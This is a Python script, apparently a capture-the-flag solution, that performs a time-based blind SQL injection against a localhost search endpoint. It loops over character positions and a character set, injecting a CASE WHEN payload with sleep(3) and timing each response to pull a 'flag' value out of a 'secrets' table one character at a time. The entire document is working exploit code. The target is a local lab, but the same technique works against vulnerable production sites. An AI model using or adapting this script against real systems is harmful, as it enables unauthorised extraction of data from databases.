import requests
import time
import string

url = "http://localhost:5000/search"
flag = ""
charset = string.ascii_letters + string.digits + "{}_"

print("[*] Starting blind SQLi extraction...")

for i in range(1, 50):  # Assume max flag length is 50
    found = False
    for c in charset:
        payload = f"' OR (SELECT CASE WHEN (substr((SELECT flag FROM secrets),{i},1)='{c}') THEN sleep(3) ELSE 0 END)--"
        start = time.time()
        r = requests.get(url, params={"q": payload})
        elapsed = time.time() - start
        if elapsed > 2.5:
            flag += c
            print(f"[+] Found character {i}: {c} → {flag}")
            found = True
            break
    if not found:
        print("[*] Extraction complete.")
        break

print(f"\n[✓] Final flag: {flag}")
